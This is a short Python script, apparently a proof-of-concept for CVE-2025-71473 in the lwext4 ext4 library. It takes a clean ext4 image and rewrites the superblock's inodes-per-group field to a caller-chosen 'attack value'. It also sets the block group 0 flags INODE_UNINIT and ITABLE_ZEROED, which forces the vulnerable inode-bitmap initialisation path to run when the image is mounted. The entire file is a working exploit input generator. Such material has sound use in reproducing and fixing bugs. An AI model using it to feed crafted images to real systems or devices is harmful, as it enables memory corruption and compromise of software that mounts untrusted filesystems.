#!/usr/bin/env python3
"""Patch a pristine lwext4 ext4 image for CVE-2025-71473.

The base image is produced by the *unmodified* lwext4 v1.0.0 ext4_mkfs()
through mount_driver.c. Here we change only two on-disk fields:

  * superblock s_inodes_per_group (byte offset 1024+40) to the attack value;
  * group 0 descriptor bg_flags (byte offset 4096+18) to set INODE_UNINIT
    (0x0001) so the real ext4_fs_get_block_group_ref() calls
    ext4_fs_init_inode_bitmap(), and ITABLE_ZEROED (0x0004) so only the
    bitmap path is exercised.

No lwext4 source is modified. Usage: craft_image.py BASE OUT IPG
"""
import shutil
import struct
import sys

SB_OFF = 1024
BG0_OFF = 4096
INODE_UNINIT = 0x0001
ITABLE_ZEROED = 0x0004


def main():
    base, out, raw_ipg = sys.argv[1], sys.argv[2], int(sys.argv[3], 0)
    shutil.copyfile(base, out)
    with open(out, "r+b") as f:
        f.seek(SB_OFF + 56)
        magic = struct.unpack("<H", f.read(2))[0]
        f.seek(SB_OFF + 24)
        log_bs = struct.unpack("<I", f.read(4))[0]
        f.seek(SB_OFF + 40)
        old_ipg = struct.unpack("<I", f.read(4))[0]
        f.seek(SB_OFF + 254)
        desc_size = struct.unpack("<H", f.read(2))[0]
        if magic != 0xEF53 or log_bs != 2 or desc_size != 32:
            raise SystemExit(f"unexpected geometry magic={magic:#x} log_bs={log_bs} dsc={desc_size}")
        f.seek(SB_OFF + 40)
        f.write(struct.pack("<I", raw_ipg))
        f.seek(BG0_OFF + 18)
        flags = struct.unpack("<H", f.read(2))[0]
        new_flags = (flags | INODE_UNINIT | ITABLE_ZEROED) & ~0x0002
        f.seek(BG0_OFF + 18)
        f.write(struct.pack("<H", new_flags))
        f.flush()
    print(f"OUT={out} MAGIC={magic:#x} BS={1 << (log_bs + 10)} "
          f"IPG={old_ipg}->{raw_ipg} BG0_FLAGS={flags:#06x}->{new_flags:#06x}")


if __name__ == "__main__":
    main()
